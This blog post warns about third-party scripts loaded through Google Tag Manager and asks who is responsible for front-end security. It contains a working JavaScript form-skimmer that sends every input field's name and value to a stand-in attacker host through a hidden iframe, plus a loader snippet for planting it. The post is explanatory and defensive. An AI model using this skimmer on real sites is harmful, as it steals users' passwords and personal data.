body_html:
I recently read this blog-post by Yapni Berhanu, about the dangers of 3rd-party scripts — something we include in tools like Google Tag Manager without blinking twice. This sentence in particular grabbed my attention:

Any time you include someone else’s external script on your page, there’s an inherent security risk because that script has full access to the front end of your site.

The potential security-problems might not be with your trusted vendors, but what if they get hacked, and inject malicious code?

I’m not a hacker, so this might not be the most sophisticated example, but it’s an example of a script that:

  1. Adds an event-listener to all input-elements.
  2. When the user leaves an input-field, it creates an iframe with the input-fields’ details added to the hash-fragment or querystring-part of the src of the iframe.
  3. After 250 milliseconds, the iframe is deleted, that should be sufficient time for the details to be grabbed and proccesed.
(function(url){
	var d=document,i=d.querySelectorAll("input"),l=location,n=i.length;
	while(n--)i[n].addEventListener("blur",H,false);
	function H(){
		if (this.value){
			var F=d.createElement("iframe"),T;
	  		F.width=0;F.height=0;F.src=l.protocol+"//"+url+l.host+"?"+this["name"]+"="+this.value;
	    	d.body.appendChild(F);
	    	T= window.setTimeout(function(){d.body.removeChild(F);},250);
    	}
	}
})("evildoman.com/#");

You can include the script from an innocent-looking script in Google Tag Manager, this is, typically, what an external tracking-script implementation would look like in a Custom HTML tag:

<script>
(function(d,s){
	h=d.getElementsByTagName("head")[0];
	o=d.createElement("script");
	o.async=1;
	o.src=s;
	h.appendChild(r);
})(document,"//nicedomain.com/tracking.js");
</script>

— and voila!, the nice-domain-script loads the evil-domain-script, and all form fields on the page will create an iframe and post the field’s value and name in the src of the frame.

I added a snippet in Dev Tools, and tried to trigger this code on Amazon and Facebook.
This is a “thought” example, since none of these would allow 3rd-party-scripts on their login-page, but I noticed a small difference:

Facebook fired an XHR-post every time I leaved an input field — my guess is they’re using a MutationObserver, code that is called whenever something in the DOM changes, but can’t this be overwritten by a 3rd-party-script as well?

And would it make sense to track all “outgoing” traffic by having an XHR Listener?

I don’t know, but should I? This leads to the next question:

Who has the front-end security responsibility?

  1. Is it the front-end developer’s responsibility to safe-guard the JavaScript from (present and future) attacks?
  2. Is it the digital agency who’re adding 3rd-party-scripts from a tool like Google Tag Manager?
  3. Is it the marketeer requesting a 3rd-party-script to be added?

I would argue there’s enough on the front-end developers plate already (a new, hot, must-use framework coming out every week!), and since I predict there will not be less hacking attempts in the future, who really has the security responsibility here?

Yapni Berhanu concludes his blog-post with this (excerpts):

Do you only allow sources you highly trust?
Do you vet the code yourself by reading it or watching DevTools closely?

— which suggest, it’s either the webmaster or the front-end developer’s responsibility.
I guess that is up for discussion, but until then, it might be a good idea to remove 3rd-party-scripts from pages, where users enter data.

In Google Tag Manager one can add exception-triggers, so the 3rd-part-scripts are only loaded on the correct URL’s.

But then: what about forms in overlays? They don’t have a unique URL for the exception-trigger.

And then, there’s XSS …
